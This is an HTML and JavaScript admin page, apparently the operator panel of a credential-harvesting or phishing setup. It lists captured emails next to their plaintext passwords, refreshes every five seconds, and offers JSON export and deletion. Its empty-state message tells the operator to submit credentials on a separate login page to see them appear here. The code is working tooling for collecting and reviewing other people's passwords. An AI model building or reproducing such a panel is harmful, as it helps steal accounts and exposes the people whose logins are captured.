<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <title>Admin Dashboard - Login Records</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
        }

        .header {
            background: white;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .header h1 {
            color: #333;
            margin-bottom: 5px;
        }

        .header p {
            color: #666;
            font-size: 14px;
        }

        .controls {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            flex-wrap: wrap;
        }

        button {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .btn-refresh {
            background: #667eea;
            color: white;
        }

        .btn-refresh:hover {
            background: #5568d3;
        }

        .btn-clear {
            background: #ff6b6b;
            color: white;
        }

        .btn-clear:hover {
            background: #ff5252;
        }

        .btn-export {
            background: #51cf66;
            color: white;
        }

        .btn-export:hover {
            background: #40c057;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .stat-number {
            font-size: 32px;
            font-weight: bold;
            color: #667eea;
        }

        .stat-label {
            color: #666;
            font-size: 12px;
            text-transform: uppercase;
            margin-top: 5px;
        }

        .table-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            background: #f8f9fa;
            padding: 15px;
            text-align: left;
            font-weight: 600;
            color: #333;
            border-bottom: 2px solid #e9ecef;
        }

        td {
            padding: 12px 15px;
            border-bottom: 1px solid #e9ecef;
            color: #666;
            font-size: 14px;
        }

        tr:hover {
            background: #f8f9fa;
        }

        .empty-state {
            text-align: center;
            padding: 40px;
            color: #999;
        }

        .empty-state svg {
            width: 60px;
            height: 60px;
            margin-bottom: 15px;
            opacity: 0.5;
        }

        .badge {
            display: inline-block;
            padding: 4px 8px;
            background: #e7f5ff;
            color: #1971c2;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
        }

        .timestamp {
            font-size: 12px;
            color: #999;
        }

        .loading {
            text-align: center;
            padding: 40px;
            color: #999;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .alert {
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 15px;
            display: none;
        }

        .alert.success {
            display: block;
            background: #d3f9d8;
            color: #2f5233;
            border: 1px solid #51cf66;
        }

        .alert.error {
            display: block;
            background: #ffe0e0;
            color: #5f2120;
            border: 1px solid #ff6b6b;
        }

        @media (max-width: 600px) {
            table {
                font-size: 12px;
            }

            th, td {
                padding: 8px 10px;
            }

            .controls {
                flex-direction: column;
            }

            button {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîê Login Records Dashboard</h1>
            <p>View all saved login credentials</p>
            <div class="controls">
                <button class="btn-refresh" onclick="loadData()">üîÑ Refresh</button>
                <button class="btn-export" onclick="exportData()">üì• Export JSON</button>
                <button class="btn-clear" onclick="confirmClear()">üóëÔ∏è Clear All</button>
            </div>
        </div>

        <div id="alert"></div>

        <div class="stats">
            <div class="stat-box">
                <div class="stat-number" id="totalLogins">0</div>
                <div class="stat-label">Total Logins</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="uniqueEmails">0</div>
                <div class="stat-label">Unique Emails</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="lastLogin">-</div>
                <div class="stat-label">Last Login</div>
            </div>
        </div>

        <div class="table-container">
            <div id="content">
                <div class="loading">
                    <div class="spinner"></div>
                    Loading login records...
                </div>
            </div>
        </div>
    </div>

    <script>
        /**
         * Load all login records from the server
         */
        async function loadData() {
            const contentDiv = document.getElementById("content");
            contentDiv.innerHTML = '<div class="loading"><div class="spinner"></div>Loading...</div>';

            try {
                const response = await fetch("/api/get-logins");
                const result = await response.json();

                if (!result.success) {
                    showAlert("Error loading data", "error");
                    contentDiv.innerHTML = '<div class="empty-state"><p>Error loading records</p></div>';
                    return;
                }

                const data = result.data || [];
                updateStats(data);
                renderTable(data);
            } catch (error) {
                console.error("[v0] Error:", error);
                showAlert("Failed to load data: " + error.message, "error");
                contentDiv.innerHTML = '<div class="empty-state"><p>Error loading records</p></div>';
            }
        }

        /**
         * Update statistics dashboard
         */
        function updateStats(data) {
            document.getElementById("totalLogins").textContent = data.length;

            const uniqueEmails = new Set(data.map(item => item.email)).size;
            document.getElementById("uniqueEmails").textContent = uniqueEmails;

            if (data.length > 0) {
                const lastDate = new Date(data[data.length - 1].timestamp);
                document.getElementById("lastLogin").textContent = formatTime(lastDate);
            }
        }

        /**
         * Render login records table
         */
        function renderTable(data) {
            const contentDiv = document.getElementById("content");

            if (data.length === 0) {
                contentDiv.innerHTML = `
                    <div class="empty-state">
                        <p>No login records yet</p>
                        <p style="font-size: 12px; margin-top: 10px;">Visit the login page and submit credentials to see them here</p>
                    </div>
                `;
                return;
            }

            let html = `
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Email</th>
                            <th>Password</th>
                            <th>Timestamp</th>
                        </tr>
                    </thead>
                    <tbody>
            `;

            data.forEach((item, index) => {
                const date = new Date(item.timestamp);
                html += `
                    <tr>
                        <td>${index + 1}</td>
                        <td><span class="badge">${escapeHtml(item.email)}</span></td>
                        <td><code>${escapeHtml(item.password)}</code></td>
                        <td>
                            <div>${date.toLocaleDateString()}</div>
                            <div class="timestamp">${date.toLocaleTimeString()}</div>
                        </td>
                    </tr>
                `;
            });

            html += `
                    </tbody>
                </table>
            `;

            contentDiv.innerHTML = html;
        }

        /**
         * Export data as JSON file
         */
        function exportData() {
            fetch("/api/get-logins")
                .then(res => res.json())
                .then(result => {
                    const dataStr = JSON.stringify(result.data || [], null, 2);
                    const dataBlob = new Blob([dataStr], { type: "application/json" });
                    const url = URL.createObjectURL(dataBlob);
                    const link = document.createElement("a");
                    link.href = url;
                    link.download = `login-records-${new Date().toISOString().split('T')[0]}.json`;
                    link.click();
                    showAlert("Records exported successfully!", "success");
                })
                .catch(err => showAlert("Error exporting data", "error"));
        }

        /**
         * Confirm and clear all records
         */
        function confirmClear() {
            if (confirm("Are you sure? This will delete ALL login records. This action cannot be undone.")) {
                fetch("/api/clear-logins", { method: "DELETE" })
                    .then(res => res.json())
                    .then(result => {
                        if (result.success) {
                            showAlert("All records cleared!", "success");
                            loadData();
                        }
                    })
                    .catch(err => showAlert("Error clearing data", "error"));
            }
        }

        /**
         * Show alert message
         */
        function showAlert(message, type) {
            const alertDiv = document.getElementById("alert");
            alertDiv.textContent = message;
            alertDiv.className = `alert ${type}`;
            setTimeout(() => {
                alertDiv.className = "alert";
            }, 3000);
        }

        /**
         * Format time display
         */
        function formatTime(date) {
            const now = new Date();
            const diff = now - date;
            const seconds = Math.floor(diff / 1000);
            const minutes = Math.floor(seconds / 60);
            const hours = Math.floor(minutes / 60);
            const days = Math.floor(hours / 24);

            if (days > 0) return `${days}d ago`;
            if (hours > 0) return `${hours}h ago`;
            if (minutes > 0) return `${minutes}m ago`;
            return "Just now";
        }

        /**
         * Escape HTML to prevent XSS
         */
        function escapeHtml(text) {
            const map = {
                "&": "&amp;",
                "<": "&lt;",
                ">": "&gt;",
                '"': "&quot;",
                "'": "&#039;",
            };
            return text.replace(/[&<>"']/g, m => map[m]);
        }

        // Load data when page opens
        loadData();

        // Auto-refresh every 5 seconds
        setInterval(loadData, 5000);
    </script>
</body>
</html>
